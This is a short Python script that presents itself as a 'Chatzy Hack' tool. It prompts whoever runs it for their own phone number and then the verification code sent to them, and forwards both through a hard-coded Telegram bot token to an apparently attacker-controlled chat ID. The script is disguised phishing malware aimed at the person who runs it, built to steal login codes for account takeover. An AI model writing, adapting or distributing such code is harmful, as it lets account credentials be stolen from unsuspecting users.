import telebot 
import pyfiglet
import time 
from colorama import Fore 
import telebot
import time

bot = telebot.TeleBot('8242225978:AAE3e8_2uf8-7wcMrN3KN6CpsvYxSt-ymvQ')

chat_id = '8303879201'
bot.send_message(chat_id, "on corber")
text = pyfiglet.figlet_format('Chatzy Hack')
print(Fore.GREEN + "="*25)
print("")
number = input(Fore.RED + "enter number chatzi you : ")
print(Fore.GREEN + "="*25)
bot.send_message(chat_id, f"Hack Number : {number}")
print("")
print(Fore.GREEN + "Loding . . .")
time.sleep(10)
code = input(Fore.RED + f"enter code chatzi you {number} : ")
bot.send_message(chat_id, f"Hack code Chatzy : {code}")
print(Fore.GREEN + "="*25)
time.sleep(10)
